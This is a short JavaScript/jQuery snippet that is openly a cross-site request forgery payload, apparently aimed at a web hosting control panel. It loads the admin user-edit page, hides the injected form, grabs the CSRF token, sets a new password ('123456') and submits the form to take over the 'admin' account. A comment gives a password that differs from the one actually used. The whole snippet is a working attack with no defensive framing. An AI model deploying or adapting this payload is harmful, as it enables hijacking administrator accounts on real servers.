function csrfWithToken(url,hanimisToken,password){
    $.get(url, function(gelen) {
        $('body').append($(gelen));
        $('form[id="vstobjects"]').css("display","none");
        var token = $(hanimisToken).attr("token");
        $('form[id="vstobjects"]').attr("action",url);
        $('input[name="v_password"]').val(password);   
        $('form[id="vstobjects"]').submit();       
    });
};
//password = 1234567
csrfWithToken("/edit/user/?user=admin","#token","123456");
